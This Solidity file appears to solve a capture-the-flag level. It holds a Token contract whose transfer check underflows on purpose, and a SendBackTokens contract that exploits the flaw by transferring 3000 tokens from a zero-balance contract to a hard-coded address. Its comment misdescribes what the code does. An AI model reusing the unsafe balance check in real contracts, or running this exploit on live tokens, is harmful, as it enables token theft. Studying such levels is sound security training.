pragma solidity ^0.6.0;

contract Token {

    mapping(address => uint) balances;
    uint public totalSupply;

    constructor(uint _initialSupply) public {
        balances[msg.sender] = totalSupply = _initialSupply;
    }

    function transfer(address _to, uint _value) public returns (bool) {
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }

    function balanceOf(address _owner) public view returns (uint balance) {
        return balances[_owner];
    }
}

// The "trick" is to send more than 20 tokens to another address, then have that address end them back:
contract SendBackTokens {
    Token t;
    constructor() public {
        address contractAddr = 0x6Ec1E922c64cb794d096C5c058B62ade6A6D3F04;
        address myAddr = 0xafe8d48DeFC7B96912C638C8900CB71dDB1acEC4;
        t = Token(contractAddr);
        t.transfer(myAddr, 3000);
    }
}
